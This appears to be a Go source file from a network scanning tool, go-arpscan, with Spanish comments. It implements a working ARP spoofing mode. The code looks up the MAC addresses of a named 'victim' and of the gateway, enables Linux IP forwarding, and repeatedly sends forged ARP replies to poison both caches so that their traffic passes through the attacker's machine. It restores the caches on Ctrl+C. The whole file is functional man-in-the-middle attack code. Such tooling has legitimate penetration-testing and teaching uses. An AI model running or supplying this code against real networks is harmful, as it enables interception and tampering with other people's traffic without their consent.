// internal/runner/mode_spoof.go
package runner

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"go-arpscan/internal/scanner"
	"log"
	"net"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// runSpoofMode ejecuta la lógica de suplantación ARP.
func (r *Runner) runSpoofMode() error {
	iface := r.scanConfig.Interface
	log.Printf("Activando modo de suplantación ARP en la interfaz %s (%s)", iface.Name, iface.HardwareAddr)

	victimIP := net.ParseIP(r.cfg.SpoofTargetIP)
	gatewayIP := net.ParseIP(r.cfg.GatewayIP)
	if victimIP == nil || gatewayIP == nil {
		return fmt.Errorf("IP de víctima o gateway inválida")
	}
	victimIP = victimIP.To4()
	gatewayIP = gatewayIP.To4()

	// --- CORRECCIÓN CLAVE: Abrir UN SOLO handle para toda la operación de spoofing ---
	// Este diseño centraliza la gestión del recurso pcap, abordando la crítica principal.
	handle, err := pcap.OpenLive(iface.Name, 128, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("no se pudo abrir el handle de pcap para suplantación: %w", err)
	}
	defer handle.Close()

	log.Println("Obteniendo dirección MAC de la víctima...")
	victimMAC, err := r.getMacForIPWithHandle(handle, victimIP)
	if err != nil {
		return fmt.Errorf("no se pudo obtener la MAC de la víctima (%s): %w", victimIP, err)
	}
	log.Printf("-> MAC de la víctima (%s) obtenida: %s", victimIP, victimMAC)

	log.Println("Obteniendo dirección MAC del gateway...")
	gatewayMAC, err := r.getMacForIPWithHandle(handle, gatewayIP)
	if err != nil {
		return fmt.Errorf("no se pudo obtener la MAC del gateway (%s): %w", gatewayIP, err)
	}
	log.Printf("-> MAC del gateway (%s) obtenida: %s", gatewayIP, gatewayMAC)

	// Limpiar el filtro BPF antes de empezar el envenenamiento para no filtrar nuestros propios paquetes.
	if err := handle.SetBPFFilter(""); err != nil {
		log.Printf("Advertencia: no se pudo limpiar el filtro BPF: %v", err)
	}

	if err := manageIPForwarding(true); err != nil {
		log.Printf("ADVERTENCIA: No se pudo activar el reenvío de IP. El ataque puede causar una denegación de servicio. Error: %v", err)
	} else {
		log.Println("Reenvío de IP activado en el sistema.")
	}

	ctx, cancel := context.WithCancel(context.Background())
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigs
		log.Println("\nSeñal de interrupción recibida. Limpiando y saliendo...")
		cancel()
	}()

	// <<< USO DE VALOR CONFIGURABLE >>>
	ticker := time.NewTicker(r.cfg.SpoofInterval)
	defer ticker.Stop()

	log.Println("Iniciando bucle de envenenamiento ARP... Presiona Ctrl+C para detener.")
	for {
		select {
		case <-ticker.C:
			sendArpReply(handle, iface.HardwareAddr, victimMAC, gatewayIP, victimIP)
			sendArpReply(handle, iface.HardwareAddr, gatewayMAC, victimIP, gatewayIP)
		case <-ctx.Done():
			log.Println("Restaurando la caché ARP de la víctima y el gateway...")
			// <<< USO DE VALORES CONFIGURABLES PARA RESTAURACIÓN >>>
			restoreTicker := time.NewTicker(r.cfg.RestoreInterval)
			defer restoreTicker.Stop()
			restoreCtx, restoreCancel := context.WithTimeout(context.Background(), r.cfg.RestoreDuration)
			defer restoreCancel()

		restore_loop:
			for {
				select {
				case <-restoreTicker.C:
					sendArpReply(handle, gatewayMAC, victimMAC, gatewayIP, victimIP)
					sendArpReply(handle, victimMAC, gatewayMAC, victimIP, gatewayIP)
				case <-restoreCtx.Done():
					break restore_loop
				}
			}

			log.Println("Caché ARP restaurada.")

			if err := manageIPForwarding(false); err != nil {
				log.Printf("ADVERTENCIA: No se pudo desactivar el reenvío de IP: %v", err)
			} else {
				log.Println("Reenvío de IP desactivado.")
			}
			return nil
		}
	}
}

// getMacForIPWithHandle obtiene la MAC para una IP usando un handle de pcap ya abierto.
func (r *Runner) getMacForIPWithHandle(handle *pcap.Handle, ip net.IP) (net.HardwareAddr, error) {
	iface := r.scanConfig.Interface

	bpfFilter := fmt.Sprintf("arp and src host %s", ip.String())
	if err := handle.SetBPFFilter(bpfFilter); err != nil {
		return nil, fmt.Errorf("no se pudo establecer el filtro BPF para %s: %w", ip, err)
	}

	srcIP, err := scanner.GetSrcIPNet(iface)
	if err != nil {
		return nil, fmt.Errorf("no se pudo obtener la IP de origen de la interfaz: %w", err)
	}

	eth := layers.Ethernet{
		SrcMAC:       iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(iface.HardwareAddr),
		SourceProtAddress: []byte(srcIP.IP.To4()),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(ip.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return nil, err
	}

	// <<< USO DE VALOR CONFIGURABLE >>>
	ctx, cancel := context.WithTimeout(context.Background(), r.cfg.MACRequestTimeout)
	defer cancel()

	arpReplyChan := make(chan net.HardwareAddr)

	go func() {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for {
			select {
			case <-ctx.Done():
				return
			case packet, ok := <-packetSource.Packets():
				if !ok {
					return
				}
				arpLayer := packet.Layer(layers.LayerTypeARP)
				if arpLayer == nil {
					continue
				}
				arp, _ := arpLayer.(*layers.ARP)
				if arp.Operation == layers.ARPReply && bytes.Equal(arp.SourceProtAddress, ip.To4()) {
					arpReplyChan <- net.HardwareAddr(arp.SourceHwAddress)
					return
				}
			}
		}
	}()

	select {
	case <-ctx.Done():
		return nil, fmt.Errorf("timeout esperando la respuesta ARP de %s", ip)
	case mac := <-arpReplyChan:
		return mac, nil
	}
}

func sendArpReply(handle *pcap.Handle, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		log.Printf("Error enviando paquete de suplantación: %v", err)
	}
}

var originalIPForwardingValue []byte

// manageIPForwarding activa o desactiva el reenvío de IP en el sistema.
func manageIPForwarding(enable bool) error {
	// NOTA: Esta implementación es específica para Linux. Para soportar otros SO
	// (como macOS con 'sysctl' o Windows con 'netsh'), se necesitaría una
	// implementación por plataforma, idealmente detrás de una interfaz.
	if runtime.GOOS != "linux" {
		return errors.New("la gestión automática de IP forwarding solo está soportada en Linux")
	}
	const ipForwardPath = "/proc/sys/net/ipv4/ip_forward"

	if enable {
		val, err := os.ReadFile(ipForwardPath)
		if err != nil {
			return fmt.Errorf("no se pudo leer el estado actual de ip_forward: %w", err)
		}
		originalIPForwardingValue = bytes.TrimSpace(val)
		return os.WriteFile(ipForwardPath, []byte("1"), 0644)
	}

	if originalIPForwardingValue != nil {
		return os.WriteFile(ipForwardPath, originalIPForwardingValue, 0644)
	}
	return os.WriteFile(ipForwardPath, []byte("0"), 0644)
}
